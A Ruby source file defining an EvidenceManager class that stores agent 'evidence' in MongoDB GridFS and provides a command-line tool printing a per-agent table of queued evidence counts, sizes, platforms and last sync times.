# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/fixnum'

require_relative 'db'
require_relative 'grid'
require_relative 'evidence_dispatcher'

module RCS
module DB

class EvidenceManager
  include Singleton
  include RCS::Tracer
  
  SYNC_IDLE = 0
  SYNC_IN_PROGRESS = 1
  SYNC_TIMEOUTED = 2
  SYNC_PROCESSING = 3
  SYNC_GHOST = 4
  
  def store_evidence(ident, instance, content)
    shard_id = EvidenceDispatcher.instance.shard_id ident, instance
    trace :debug, "Storing evidence #{ident}:#{instance} (shard #{shard_id})"
    raise "INVALID SHARD ID" if shard_id.nil?
    return GridFS.put(content, {filename: "#{ident}:#{instance}", metadata: {shard: shard_id}}, "evidence"), shard_id
  end
  
  def run(options)

    # config file parsing
    #return 1 unless Config.instance.load_from_file

    # connect to MongoDB
    return 1 unless DB.instance.connect

    # calculate the number and the size of all the evidece for each instance
    entries = {}
    GridFS.get_distinct_filenames("evidence").each do |inst|
      entries[inst] = {count: 0, size: 0}
      GridFS.get_by_filename(inst, "evidence").each do |i|
        entries[inst][:count] += 1
        entries[inst][:size] += i["length"]
      end
      ident = inst.slice(0..13)
      instance = inst.slice(15..-1)
      agent = ::Item.agents.where({ident: ident, instance: instance}).first

      # if the agent is not found we need to delete the pending evidence
      if agent.nil?
        entries.delete(inst)
        GridFS.delete_by_filename(inst, "evidence")
        next
      end

      entries[inst][:platform] = agent[:platform]

      if agent.stat[:last_sync].nil?
        entries[inst][:time] = ""
      else
        time = Time.at(agent.stat[:last_sync]).getutc
        time = time.to_s.split(' +').first
        entries[inst][:time] = time
      end

    end

    # this will became an array
    entries = entries.sort_by {|k,v| v[:time]}

    # table definitions
    table_width = 117
    table_line = '+' + '-' * table_width + '+'

    # print the table header
    puts
    puts table_line
    puts '|' + 'instance'.center(57) + '|' + 'platform'.center(12) + '|' +
         'last sync time'.center(25) + '|' + 'logs'.center(6) + '|' + 'size'.center(13) + '|'
    puts table_line

    entries.each do |entry|
      puts "| #{entry[0]} |#{entry[1][:platform].center(12)}| #{entry[1][:time]} |#{entry[1][:count].to_s.rjust(5)} | #{entry[1][:size].to_s_bytes.rjust(11)} |"
    end

    puts table_line
    puts

    return 0
  end

  # executed from rcs-db-evidence-queue
  def self.run!(*argv)
    # reopen the class and declare any empty trace method
    # if called from command line, we don't have the trace facility
    self.class_eval do
      def trace(level, message)
        puts message
      end
    end

    DB.class_eval do
      def trace(level, message)
        puts message
      end
    end

    # This hash will hold all of the options parsed from the command-line by OptionParser.
    options = {}

    optparse = OptionParser.new do |opts|
      opts.banner = "Usage: rcs-db-evidence-queue [options] "

      opts.on( '-h', '--help', 'Display this screen' ) do
        puts opts
        return 0
      end
    end

    optparse.parse(argv)

    # execute the manager
    return EvidenceManager.instance.run(options)
  end
end # EvidenceDispatcher

end # ::DB
end # ::RCS
